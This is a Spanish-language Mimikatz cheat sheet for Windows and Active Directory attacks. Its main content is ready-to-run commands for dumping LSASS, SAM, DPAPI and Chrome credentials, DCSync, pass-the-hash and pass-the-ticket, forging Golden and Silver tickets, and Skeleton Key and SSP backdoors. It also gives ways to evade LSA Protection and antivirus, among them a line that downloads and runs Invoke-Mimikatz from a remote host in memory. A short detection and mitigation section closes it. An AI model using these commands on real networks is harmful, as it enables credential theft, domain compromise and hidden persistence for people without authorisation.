---
title: "Mimikatz Cheat Sheet"
category: "AD"
description: "La navaja suiza para extracción de credenciales, manipulación de tickets y ataques avanzados en Windows."
image: "/images/wiki/6.png"
---

# Mimikatz: Post-Exploitation y Extracción de Credenciales

**Mimikatz** es la herramienta más conocida para la extracción de credenciales en texto claro, hashes, códigos PIN y tickets Kerberos de la memoria. También permite realizar ataques de Pass-the-Hash, Pass-the-Ticket o construir Golden Tickets.

[Repositorio Oficial](https://github.com/gentilkiwi/mimikatz)

## Comandos Básicos

Siempre inicia con privilegios de administrador local.

```powershell
# Habilitar privilegios de depuración (necesario para tocar LSASS)
privilege::debug

# Elevar a SYSTEM (opcional pero útil)
token::elevate

# Abrir un cmd como SYSTEM
misc::cmd

# Abrir un Task Manager como SYSTEM (útil para inyectar en procesos)
misc::taskmgr
```

## Extracción de Credenciales (sekurlsa)

El módulo `sekurlsa` interactúa con LSASS para extraer credenciales de distintos proveedores de autenticación.

### Comandos Principales

| Comando | Descripción |
|---------|-------------|
| `sekurlsa::logonpasswords` | Extrae passwords y hashes NTLM de todas las sesiones activas |
| `sekurlsa::wdigest` | Credenciales WDigest (plaintext en sistemas pre-Win10 o con UseLogonCredential=1) |
| `sekurlsa::kerberos` | Tickets y passwords Kerberos en memoria |
| `sekurlsa::tspkg` | Credenciales del proveedor TsPkg (Terminal Services) |
| `sekurlsa::credman` | Credenciales almacenadas en Credential Manager en memoria |
| `sekurlsa::msv` | Hashes NTLM/LM del proveedor MSV1_0 |
| `sekurlsa::ssp` | Credenciales del Security Support Provider |
| `sekurlsa::dpapi` | Master keys de DPAPI en memoria |
| `sekurlsa::tickets` | Lista tickets Kerberos en memoria |
| `sekurlsa::tickets /export` | Exporta tickets como archivos .kirbi a disco |

### Forzar WDigest en Windows 10+
En Windows 10+ WDigest no guarda credenciales en plaintext por defecto. Se puede forzar cambiando un registro (requiere que el usuario vuelva a iniciar sesión):

```powershell
# Habilitar almacenamiento WDigest en plaintext
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# Después del siguiente logon del usuario, extraer
sekurlsa::wdigest
```

## Vault y Credenciales Almacenadas

```powershell
# Listar credenciales del Windows Vault (Credential Manager)
vault::cred

# Listar vaults disponibles
vault::list
```

El Vault contiene credenciales guardadas por el usuario (web, RDP, shares de red). Complementa a `sekurlsa::credman` que lee las credenciales desde la memoria de LSASS.

## Certificados (crypto)

Exportar certificados con su clave privada desde el almacén de certificados del sistema.

```powershell
# Listar certificados del almacén local
crypto::certificates /systemstore:local_machine

# Exportar certificados incluyendo claves privadas marcadas como no exportables
crypto::certificates /systemstore:local_machine /export

# Listar y exportar certificados del usuario actual
crypto::certificates /export

# Hacer exportables las claves marcadas como no exportables (parchea CryptoAPI en memoria)
crypto::capi
crypto::cng
```

Los certificados exportados pueden usarse para autenticación vía PKINIT (Kerberos), firma de código, o como parte de ataques como **Shadow Credentials** si se obtiene el certificado de una cuenta de máquina.

## Abuso de DPAPI

DPAPI (Data Protection API) protege credenciales guardadas en Windows. Mimikatz puede descifrar estos datos.

```powershell
# Descifrar credenciales guardadas (archivos .cred en %AppData%\Microsoft\Credentials\)
dpapi::cred /in:C:\Users\<User>\AppData\Roaming\Microsoft\Credentials\<GUID>

# Descifrar con master key conocida
dpapi::cred /in:<archivo_cred> /masterkey:<masterkey_hex>

# Descifrar contraseñas guardadas de Chrome
dpapi::chrome /in:"%LocalAppData%\Google\Chrome\User Data\Default\Login Data" /unprotect

# Descifrar cookies de Chrome
dpapi::chrome /in:"%LocalAppData%\Google\Chrome\User Data\Default\Cookies" /unprotect

# Listar master keys del usuario (requiere acceso a su perfil o SYSTEM)
sekurlsa::dpapi
```

## Dumpeo de Base de Datos Local

### SAM, Secrets y Cache

```powershell
# SAM: hashes de cuentas locales
lsadump::sam

# SAM desde archivos de backup (sin necesidad de estar en el sistema activo)
lsadump::sam /sam:C:\backup\SAM /system:C:\backup\SYSTEM

# LSA Secrets: contraseñas de cuentas de servicio, auto-logon, etc.
lsadump::secrets

# Cached Domain Logons (DCC2 hashes - usuarios que iniciaron sesión localmente)
lsadump::cache
```

Los hashes DCC2 de `lsadump::cache` son más lentos de crackear que NTLM (bcrypt-based). Se crackean con `hashcat -m 2100`.

### Trust Keys (Claves de Confianza entre Dominios)

```powershell
# Extraer claves de trust inter-dominio (útil para forjar inter-realm tickets)
lsadump::trust /patch

# Las trust keys permiten crear tickets para acceder a recursos cross-domain
```

## Movimiento Lateral

### Pass-the-Hash (PtH)
Inicia un proceso (cmd.exe) usando el hash NTLM de un usuario, sin saber su contraseña.

```powershell
sekurlsa::pth /user:<Usuario> /domain:<Dominio> /ntlm:<HashNTLM>

# Especificar qué programa ejecutar (por defecto cmd.exe)
sekurlsa::pth /user:<Usuario> /domain:<Dominio> /ntlm:<HashNTLM> /run:powershell.exe
```

### Overpass-the-Hash (Pass-the-Key)
Similar a PtH, pero solicita un TGT Kerberos legítimo usando el hash NTLM. El proceso resultante tiene un token Kerberos válido, lo que permite evadir detecciones basadas en NTLM.

```powershell
# Overpass-the-Hash: genera un proceso con TGT Kerberos obtenido del hash
sekurlsa::pth /user:<Usuario> /domain:<Dominio> /ntlm:<HashNTLM> /run:powershell.exe

# Diferencia clave: después de ejecutar el proceso, usar klist para ver el TGT
# El tráfico posterior será Kerberos puro (no NTLM)
```

> **Nota**: El comando es el mismo que PtH (`sekurlsa::pth`). La diferencia es operacional: en PtH usas el hash para autenticarte directamente vía NTLM. En Overpass-the-Hash, usas el hash para obtener un TGT y después el tráfico es Kerberos legítimo.

### Pass-the-Ticket (PtT)
Inyecta un ticket Kerberos (.kirbi) en la sesión actual.

```powershell
# Inyectar ticket
kerberos::ptt ticket.kirbi

# Purgar tickets de la sesión antes de inyectar (evita conflictos)
kerberos::purge
kerberos::ptt ticket.kirbi

# Verificar tickets inyectados
kerberos::list
```

## DCSync (Detalle)

Extrae credenciales simulando ser un Controlador de Dominio. Usa el protocolo de replicación MS-DRSR (DRS Remote Protocol).

### Permisos Requeridos
El usuario que ejecuta DCSync necesita los siguientes derechos de replicación sobre el dominio:

| Permiso | GUID del Derecho |
|---------|------------------|
| **Replicating Directory Changes** | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 |
| **Replicating Directory Changes All** | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 |

Por defecto, estos permisos los tienen: Domain Admins, Enterprise Admins y Domain Controllers.

### Uso
```powershell
# Dumpear un usuario específico (incluye hash NTLM, hashes LM, historial)
lsadump::dcsync /user:<Dominio>\<Usuario>

# Extraer la cuenta krbtgt (necesaria para Golden Tickets)
lsadump::dcsync /user:<Dominio>\krbtgt

# Dumpear historial de contraseñas
lsadump::dcsync /user:<Dominio>\<Usuario> /history

# Dumpear todo el dominio (muy ruidoso y lento en dominios grandes)
lsadump::dcsync /domain:<Dominio> /all /csv
```

## Persistencia

### Golden Ticket (TGT Falsificado)
Requiere el hash NTLM de la cuenta `krbtgt`. Da acceso total al dominio con validez por defecto de 10 años.

```powershell
kerberos::golden /user:Administrator /domain:<Dominio> /sid:<SID_Dominio> /krbtgt:<Hash_krbtgt> /id:500 /groups:512 /ptt
```

### Silver Ticket (TGS Falsificado)
Requiere el hash NTLM de una cuenta de servicio (ej: cuenta de máquina). Da acceso a ese servicio específico en esa máquina. No contacta al DC, por lo que es más sigiloso que un Golden Ticket.

```powershell
kerberos::golden /domain:<Dominio> /sid:<SID_Dominio> /target:<TargetMachine> /service:<Service> /rc4:<Hash_Servicio> /user:FakeUser /ptt
```

*Servicios comunes*: `cifs` (archivos), `host` (tareas programadas/wmi), `http` (WinRM/IIS), `ldap` (DCSync), `mssql` (bases de datos).

### Skeleton Key
Inyecta un backdoor en memoria en el DC. Todas las contraseñas originales siguen funcionando, pero añade una contraseña maestra ("mimikatz") que funciona para TODOS los usuarios.

```powershell
misc::skeleton
```

**Limitaciones del Skeleton Key**:
*   Solo funciona **en memoria**: no sobrevive un reinicio del DC.
*   Debe ejecutarse **en cada DC** del dominio para cobertura completa.
*   Afecta a **todo el dominio**: una sola contraseña maestra para todos los usuarios.
*   Solo funciona con autenticación **RC4** (Kerberos AES no está soportado por defecto).
*   Si LSASS está protegido con RunAsPPL, necesita el driver `mimidrv.sys` cargado:
    ```powershell
    misc::skeleton /patch
    ```

### Custom SSP (Persistencia con mimilib.dll)
Registrar `mimilib.dll` como Security Support Provider. Captura credenciales en plaintext en un archivo de log cada vez que un usuario se autentica.

```powershell
# Opción 1: Agregar mimilib.dll a la lista de SSP via registro (persiste reinicios)
# Copiar mimilib.dll a C:\Windows\System32\
# Agregar "mimilib" al registro:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib"

# Opción 2: Inyectar SSP en memoria (no persiste reinicios, más sigiloso)
misc::memssp
```

Las credenciales capturadas se guardan en `C:\Windows\System32\kiwissp.log` (mimilib) o `C:\Windows\System32\mimilsa.log` (memssp).

## Evasión de Protecciones

### LSA Protection (RunAsPPL)
Si Windows tiene LSA Protection activado (RunAsPPL), Mimikatz no puede leer LSASS directamente.

1.  **Cargar Driver**: `!+` (Carga mimidriver.sys).
2.  **Desproteger Proceso**: `!processprotect /process:lsass.exe /remove`
3.  **Dumpear**: `sekurlsa::logonpasswords`

### Credential Guard
**Credential Guard** (basado en virtualización, VBS) aísla LSASS en un contenedor seguro. Cuando está activo:

*   `sekurlsa::logonpasswords` **no obtiene hashes NTLM ni passwords** de cuentas de dominio.
*   Las credenciales locales (SAM) **no están afectadas**.
*   Credenciales delegadas (CredSSP, WDigest si está forzado) pueden seguir expuestas.

```powershell
# Verificar si Credential Guard está activo
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning
# Si SecurityServicesRunning contiene "1", Credential Guard está habilitado
```

**Alternativas cuando Credential Guard está activo**:
*   DCSync (no necesita tocar LSASS).
*   Kerberoasting (tickets TGS se solicitan al DC, no a LSASS).
*   Dumpear SAM local (`lsadump::sam`).
*   DPAPI abuse si se obtienen las master keys por otros medios.

### Ejecución desde Memoria
Para evitar detección por Windows Defender y antivirus:

*   **Invoke-Mimikatz** (reflective DLL injection via PowerShell, parte de PowerSploit):
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-Mimikatz.ps1')
    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
    ```
*   **SafetyKatz** (carga Mimikatz en memoria usando MiniDumpWriteDump + PE loading):
    Dumpea LSASS a memoria y corre una versión customizada de Mimikatz contra el dump.
*   **SharpKatz** (reimplementación en C# de funciones de Mimikatz, cargable via execute-assembly).
*   **Dumpert / NanoDump**: Dumpean LSASS usando syscalls directos para evadir hooks de EDR.
*   **Dump offline**: Crear un dump de LSASS con `procdump`, `comsvcs.dll` o Task Manager, y analizarlo offline:
    ```powershell
    # Dump con comsvcs.dll (LOLBin, no requiere herramientas externas)
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_LSASS> C:\temp\lsass.dmp full

    # Analizar dump offline con Mimikatz
    sekurlsa::minidump lsass.dmp
    sekurlsa::logonpasswords
    ```

## Detección

### Event IDs Relevantes

| Event ID | Log | Indicador |
|----------|-----|-----------|
| **4624** (Logon Type 9) | Security | Logon con credenciales explícitas (NewCredentials, usado por PtH) |
| **4662** | Security | Acceso a objetos AD con derechos de replicación (DCSync) |
| **4769** | Security | Solicitud de TGS con encryption RC4 inusual (Kerberoasting) |
| **4672** | Security | Asignación de privilegios especiales (SeDebugPrivilege) |
| **7045** | System | Nuevo servicio instalado (mimidriver.sys, mimilib) |
| **4657** | Security | Modificación de valores de registro (WDigest, Security Packages) |

### Reglas de Detección
*   **Sysmon**: Reglas para detectar acceso a `lsass.exe` (Event ID 10 - ProcessAccess) desde procesos no autorizados.
*   **YARA**: Firmas para detectar el binario de Mimikatz en disco o en memoria (strings como "mimikatz", "gentilkiwi", "sekurlsa").
*   **Monitorizar** cambios en la clave de registro `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`.
*   **Alertar** sobre eventos 4662 con GUIDs de replicación desde cuentas que no son Domain Controllers.

### Mitigaciones
*   Habilitar **Credential Guard** en endpoints compatibles (Windows 10 Enterprise / Server 2016+).
*   Configurar **RunAsPPL** para proteger el proceso LSASS.
*   Deshabilitar **WDigest** (por defecto en Win10+, verificar en sistemas legacy).
*   Implementar **tiering administrativo** (no usar cuentas DA en workstations).
*   Rotar la contraseña de **krbtgt** periódicamente (dos veces, ya que AD guarda el historial de una rotación).
*   Monitorizar con **EDR/SIEM** los accesos anómalos a LSASS y solicitudes de replicación.
